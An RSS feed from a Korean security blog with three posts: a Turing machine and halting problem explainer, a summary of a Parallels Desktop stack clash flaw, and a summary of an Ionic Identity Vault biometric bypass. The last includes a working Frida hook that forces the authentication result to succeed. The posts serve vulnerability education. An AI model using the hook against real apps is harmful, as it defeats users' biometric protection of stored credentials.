<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 15 Sep 2021 05:00:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[해키피디아] Turing Machine, Halt Problem</title>
      <link>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/</link>
      <guid>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/</guid>
      <pubDate>Wed, 15 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC568;&amp;#xB7F0; &amp;#xD29C;&amp;#xB9C1;&amp;#xC758; &amp;#xC5D0;&amp;#xB2C8;&amp;#xADF8;&amp;#xB9C8; &amp;#xC554;&amp;#xD638; &amp;#xD574;&amp;#xB3C5;&amp;#xC744; &amp;#xB2F4;&amp;#xC740; &amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC758; &#xC5D0;&#xB2C8;&#xADF8;&#xB9C8; &#xC554;&#xD638; &#xD574;&#xB3C5;&#xC744; &#xB2F4;&#xC740; &#xC601;&#xD654; &#xC774;&#xBBF8;&#xD14C;&#xC774;&#xC158; &#xAC8C;&#xC784;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A5;&#xBA74;&#xC5D0; &#xB098;&#xC624;&#xB294; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>Turing&#x2019;s work inspired generations of research into what scientist calls &#x201C;turing machines&#x201D;. Today, we call them computers.</p></blockquote><p>&#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC774; &#xACE0;&#xC548;&#xD55C; &#xAE30;&#xACC4;&#xB85C; &#xD2B9;&#xC815; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xB367;&#xC148;, &#xBE84;&#xC148;, &#xACF1;&#xC148;&#xC740; &#xBB3C;&#xB860; &#xD604;&#xB300; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC740; &#xBAA8;&#xB450; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xB2E4;&#xB9CC; &#xC2DC;&#xAC04;&#xC774; &#xC624;&#xB798; &#xAC78;&#xB9BD;&#xB2C8;&#xB2E4;.)</p><p>&#xD29C;&#xB9C1;-&#xC644;&#xC804;(Turing-Complete)&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB5A4; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC744; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xADF8; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xD29C;&#xB9C1;-&#xC644;&#xC804;&#xD558;&#xB2E4;&#xACE0; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB370;&#xC774;&#xBE44;&#xB4DC; &#xD790;&#xBCA0;&#xB974;&#xD2B8;(David Hilbert)&#xB294; &#x2018;&#xBAA8;&#xB4E0; &#xC218;&#xD559;&#xC801; &#xBB38;&#xC81C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xADF8; &#xBB38;&#xC81C;&#xAC00; &#xCC38;&#xC778;&#xC9C0; &#xAC70;&#xC9D3;&#xC778;&#xC9C0;&#xB97C; &#xD655;&#xC2E4;&#xD558;&#xAC8C; &#xACB0;&#xC815;&#xD574;&#xC904; &#xBA85;&#xD655;&#xD55C; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xC99D;&#xBA85;&#xD558;&#xC2DC;&#xC624;&#x2019; &#xC640; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xB97C; &#xB0B4;&#xACE0;, &#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC740; &#xC774;&#xB97C; &#xC815;&#xC9C0; &#xBB38;&#xC81C;(Halting Problem)&#xB85C; &#xBC1C;&#xC804;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB780; &#x2018;&#xC8FC;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD574;&#xACB0;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294;&#xC9C0; &#xB9D0;&#xD574;&#xC904; &#xC218; &#xC788;&#xB294; &#xC77C;&#xBC18;&#xD654;&#xB41C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xAC00;?&#x2019;(&#xC5B4;&#xB5A4; &#xC785;&#xB825; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC1B;&#xC558;&#xC744; &#xB54C;, &#xC720;&#xD55C;&#xD55C; &#xB2E8;&#xACC4; &#xC774;&#xD6C4;&#xC5D0; &#xB2F5;&#xC774; &#xB098;&#xC62C; &#xAC83;&#xC778;&#xC9C0;, &#xBB34;&#xD55C;&#xB8E8;&#xD504; &#xB4F1;&#xC744; &#xB3CC;&#xBA70; &#xC601;&#xC6D0;&#xD788; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC778;&#xC9C0;)&#xB77C;&#xB294; &#xBB38;&#xC81C;&#xBA70; &#xC774;&#xB97C; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC99D;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/15/y00n_nms/turing-machine/image.png" alt="image"></p><p><strong>&#xADF8;&#xB7FC; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xBB34;&#xC5C7;&#xC77C;&#xAE4C;?</strong></p><p>&#xB05D;&#xC5C6;&#xC774; &#xAE34; &#xCE78;&#xC5D0; &#xAE30;&#xD638;&#xB4E4;&#xC774; &#xC801;&#xD600;&#xC788;&#xB294; &#xD14C;&#xC774;&#xD504;(Tape)&#xC640; &#xD14C;&#xC774;&#xD504;&#xC5D0; &#xAE30;&#xB85D;&#xB41C; &#xAE30;&#xD638;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD558;&#xB294; &#xC7A5;&#xCE58;(Head), &#xADF8;&#xB9AC;&#xACE0; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xC0C1;&#xD0DC; &#xAE30;&#xB85D;&#xAE30;(State register), &#xAE30;&#xACC4;&#xC758; &#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xD45C;(Action Table)&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xD45C;&#xC758; &#xC608;&#xB97C; &#xB4E4;&#xBA74; &#x2018;&#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xAC00; &#x2018;A&#x2019;&#xC77C; &#xB54C; &#xD14C;&#xC774;&#xD504;&#xC5D0;&#xC11C; &#x2018;1&#x2019;&#xC744; &#xB9CC;&#xB098;&#xBA74; &#x2018;P&#x2019;&#xB97C; &#xC4F0;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC73C;&#xB85C; &#xD55C; &#xCE78; &#xC774;&#xB3D9;&#xD558;&#xACE0; &#xC0C1;&#xD0DC;&#xB97C; &#x2018;B&#x2019;&#xB85C; &#xC218;&#xC815;&#x2019;, &#x2018;&#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xAC00; &#x2018;C&#x2019;&#xC77C; &#xB54C; &#xD14C;&#xC774;&#xD504;&#xC5D0;&#xC11C; &#x2018;1&#x2019;&#xC744; &#xB9CC;&#xB098;&#xBA74; &#x2018;P&#x2019;&#xB97C; &#xC4F0;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC73C;&#xB85C; &#xD55C; &#xCE78; &#xC774;&#xB3D9;&#xD558;&#xACE0; &#xC0C1;&#xD0DC;&#xB97C; &#x2018;HALT&#x2019;(&#xC815;&#xC9C0;)&#xC73C;&#xB85C; &#xC218;&#xC815;&#xACFC; &#xAC19;&#xC740; &#xADDC;&#xCE59;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xC5D0; &#xB530;&#xB77C; &#xD14C;&#xC774;&#xD504; &#xCE78;&#xC758; &#xAE30;&#xD638;&#xB97C; &#xC77D;&#xACE0; &#xC218;&#xC815;&#xD558;&#xBA70; &#xC88C;&#xC6B0;&#xB85C; &#xC6C0;&#xC9C1;&#xC774;&#xBA74;&#xC11C; &#xAE30;&#xACC4;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC804;&#xBD80;&#xC774;&#xBA70;, &#xC774;&#xB7EC;&#xD55C; &#xACFC;&#xC815;&#xC73C;&#xB85C; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C; &#xAE30;&#xACC4;&#xAC00; &#xB367;&#xC148;&#xB9CC; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74;, Universal Computing Machine&#xC740; &#xBAA8;&#xB4E0; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xC2DC;, &#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xADC0;&#xB958;&#xBC95;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xC815;&#xC9C0;&#xD560;&#xC9C0; &#xC548; &#xD560;&#xC9C0;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xD310;&#xBCC4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774;&#xAC83;&#xC744; &#xD310;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC815;&#xC9C0; &#xBB38;&#xC81C; &#xD310;&#xBCC4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; <code>exit(a, i)</code> &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0; a&#xAC00; &#xC785;&#xB825; i&#xC5D0; &#xB300;&#xD574; &#xC815;&#xC9C0;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; true, &#xC544;&#xB2C8;&#xB77C;&#xBA74; false&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC989; a(i)&#xAC00; &#xBB34;&#xD55C;&#xB8E8;&#xD504;&#xC5D0; &#xBE60;&#xC9C4;&#xB2E4;&#xBA74; <code>exit(a, i)==false</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p>exit&#xB97C; &#xBAA8;&#xC21C; &#xC2DC;&#xD0A4;&#xB294; <code>subroutine()</code> &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>exit(s,s)</code>&#xB294; &#xC790;&#xAE30; &#xC790;&#xC2E0;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xB123;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">function subroutine(s){<span class="hljs-keyword">if</span> exit(s,s) == false<span class="hljs-keyword">return</span> true<span class="hljs-keyword">else</span>infinite loop}</code></pre><p>true&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; infinite loop&#xC5D0; &#xC758;&#xD574; &#xBB34;&#xD55C;&#xB8E8;&#xD504;&#xB97C; &#xD558;&#xBBC0;&#xB85C; &#xCC38;&#xC77C; &#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xBA70;, false&#xC774;&#xBA74; true&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBBC0;&#xB85C; &#xAC70;&#xC9D3;&#xC77C; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBCF5;&#xC7A1;&#xD574; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xC774;&#xB294; &#xB9C8;&#xCE58; &#x2018;&#xC774; &#xBB38;&#xC7A5;&#xC740; &#xAC70;&#xC9D3;&#xB9D0;&#xC774;&#xB2E4;&#x2019; &#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC774; &#xCC38;&#xC77C;&#xC9C0;, &#xAC70;&#xC9D3;&#xC77C;&#xC9C0; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBAA8;&#xC21C;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; &#xACB0;&#xAD6D; &#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBAA8;&#xC21C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xB7F0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xACB0;&#xB860;&#xC774; &#xB098;&#xC624;&#xBA70; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; &#x2018;&#xACC4;&#xC0B0;&#x2019;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC758; &#xD55C;&#xACC4;&#xB97C; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.udiprod.com/halting-problem/#faq">&#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xC5D0; &#xB300;&#xD574; &#xAC00;&#xC7A5; &#xC27D;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xC601;&#xC0C1;&#xACFC; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xB0A8;&#xAE34; &#xC9C8;&#xBB38;&#xC5D0; &#xB300;&#xD55C; &#xB2F5;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xC5B4;&#xB824;&#xC6C0;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xBCF4;&#xC2DC;&#xAE30;&#xB97C; &#xCD94;&#xCC9C;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/turing-machine/">turing machine</category>
      
      <category domain="https://hackyboiz.github.io/tags/alan-turing/">alan turing</category>
      
      <category domain="https://hackyboiz.github.io/tags/halt-problem/">halt problem</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PARALLELS DESKTOP STACK CLASH VULNERABILITY</title>
      <link>https://hackyboiz.github.io/2021/09/14/fabu1ous/2021-09-14/</link>
      <guid>https://hackyboiz.github.io/2021/09/14/fabu1ous/2021-09-14/</guid>
      <pubDate>Tue, 14 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/9/9/analysis-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/9/9/analysis-of-a-parallels-desktop-stack-clash-vulnerability-and-variant-hunting-using-binary-ninja">ANALYSIS OF A PARALLELS DESKTOP STACK CLASH VULNERABILITY AND VARIANT HUNTING USING BINARY NINJA</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Parallels Desktop 16.1.3</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Parallels Desktop&#xC5D0;&#xC11C; Stack Clash &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Parallels Desktop&#xC740; Parallels ToolGate&#xB77C;&#xB294; paravirtual PCI device&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; Guest &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; ToolGate messaging protocol&#xC744; &#xC0AC;&#xC6A9;&#xD574; host&#xC758; virtual device&#xC640; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. Guest &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xBA54;&#xC138;&#xC9C0;&#xC640; &#xBA54;&#xC138;&#xC9C0;&#xC758; physical addr&#xB97C; <code>TG_PAGED REQEIST</code> &#xAD6C;&#xC870;&#xC5D0; &#xB2F4;&#xC544; &#xC804;&#xC1A1;&#xD558;&#xACE0; host&#xAC00; physical addr&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xB9E4;&#xD551;&#xD558;&#xACE0; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xB41C; handler&#xB85C; &#xCEE8;&#xD2B8;&#xB864;&#xC744; &#xB118;&#xACA8; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; guest&#xAC00; &#xBCF4;&#xB0B8; request&#xC5D0; &#xB2F4;&#xAE34; size&#xAC12;&#xC744; &#xD1B5;&#xD574; host buffer&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294;&#xB370; &#xBB38;&#xC81C;&#xB294; guest&#xAC00; &#xC81C;&#xACF5;&#xD558;&#xB294; size &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5B4; uncontrolled memory allocation&#xC5D0; &#xC758;&#xD55C; stack clash &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xAD49;&#xC7A5;&#xD788; &#xD070; size&#xC758; &#xBA54;&#xBAA8;&#xB9AC;  &#xD560;&#xB2F9;&#xC744; &#xC694;&#xCCAD;&#xD574; ToolGate request&#xB97C; &#xCC98;&#xB9AC; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Stack Pointer(RSP) &#xC704;&#xCE58;&#xB97C; &#xB2E4;&#xB978; &#xC4F0;&#xB808;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778; stack &#xC601;&#xC5ED;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; guest&#xC5D0;&#xC11C; &#xBCF4;&#xB0B8; &#xB370;&#xC774;&#xD130;&#xB85C; host&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC624;&#xC5FC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/parallels/">parallels</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack/">stack</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-clash/">stack clash</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/14/fabu1ous/2021-09-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Ionic Identity Vault Biometric Authentication Bypass</title>
      <link>https://hackyboiz.github.io/2021/09/11/j0ker/2021-09-11/</link>
      <guid>https://hackyboiz.github.io/2021/09/11/j0ker/2021-09-11/</guid>
      <pubDate>Sat, 11 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.compass-security.com/2021/09/ionic-identity-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.compass-security.com/2021/09/ionic-identity-vault-biometric-authentication-bypass/">https://blog.compass-security.com/2021/09/ionic-identity-vault-biometric-authentication-bypass/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>GraphQL</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC5D1;&#xC138;&#xC2A4; &#xD1A0;&#xD070; &#xAC19;&#xC740; &#xC778;&#xC99D; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Ionic Identity Vault&#xC5D0;&#xC11C; &#xC0DD;&#xCCB4;&#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xC720;&#xC800;&#xAC00; &#xB370;&#xC774;&#xD130; &#xC811;&#xADFC; &#xC778;&#xC99D;&#xC744; &#xC704;&#xD574; &#xC0DD;&#xCCB4;&#xC778;&#xC99D;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xAC8C; &#xB418;&#xBA74; <code>automaticallyCreateKey</code> &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC18C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>KeyGenParameterSpec.Builder</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; KeyStore entry&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>setUserAuthenticationRequired</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544; KeyStore entry&#xB294; &#xC0AC;&#xC6A9;&#xB420; &#xB54C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC0DD;&#xCCB4;&#xC778;&#xC99D;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xC9C0; &#xC54A;&#xAC8C;&#xB418;&#xACE0; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC720;&#xC800;&#xAC00; &#xB370;&#xC774;&#xD130; &#xC811;&#xADFC;&#xC744; &#xD558;&#xAC8C;&#xB418;&#xBA74; &#xC0DD;&#xCCB4;&#xC778;&#xC99D;&#xC744; &#xC704;&#xD55C; &#xD654;&#xBA74;&#xC774; &#xD31D;&#xC5C5;&#xB418;&#xACE0; &#xC9C0;&#xBB38;&#xC778;&#xC2DD;&#xC744; &#xD558;&#xBA74; loadKey &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815; &#xC804;&#xC5D0; <code>onBiometricActivityResult</code> &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370;, &#xC778;&#xC99D; &#xACB0;&#xACFC;&#xB97C; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xC99D; &#xACB0;&#xACFC;&#xAC00; -1&#xC774;&#xBA74; &#xC778;&#xC99D;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xC5EC; forceUnlock &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>KeyStore entry&#xAC00; &#xC778;&#xC99D;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>onBiometricActivityResult</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; <code>onBiometricActivityResult</code>&#xC758; &#xCCAB;&#xBC88;&#xC7AC; &#xC778;&#xC790;&#xB97C; -1&#xB85C; &#xC138;&#xD305;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql">Java.<span class="hljs-keyword">perform</span>(<span class="hljs-keyword">function</span> x() {  var myclass = Java.use(&quot;com.ionicframework.auth.IonicNativeAuth&quot;);  myclass.onBiometricActivityResult.implementation = <span class="hljs-keyword">function</span> (a, b) {    console.log(&quot;[*] Biometric Authentication Bypass Hook&quot;);    console.log(&quot;Class: com.ionicframework.auth.IonicNativeAuth&quot;);    console.log(&quot;  Method: onBiometricActivityResult&quot;);    console.log(&quot;  Parameter: &quot; + a);    console.log(&quot;Change result from 0 to -1 in order to bypass authentication.&quot;);    this.onBiometricActivityResult(<span class="hljs-number">-1</span>, b); // This calls the <span class="hljs-keyword">method</span> <span class="hljs-keyword">always</span> <span class="hljs-keyword">with</span> <span class="hljs-number">-1</span>  }});</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ionic-Identity-Vault/">Ionic Identity Vault</category>
      
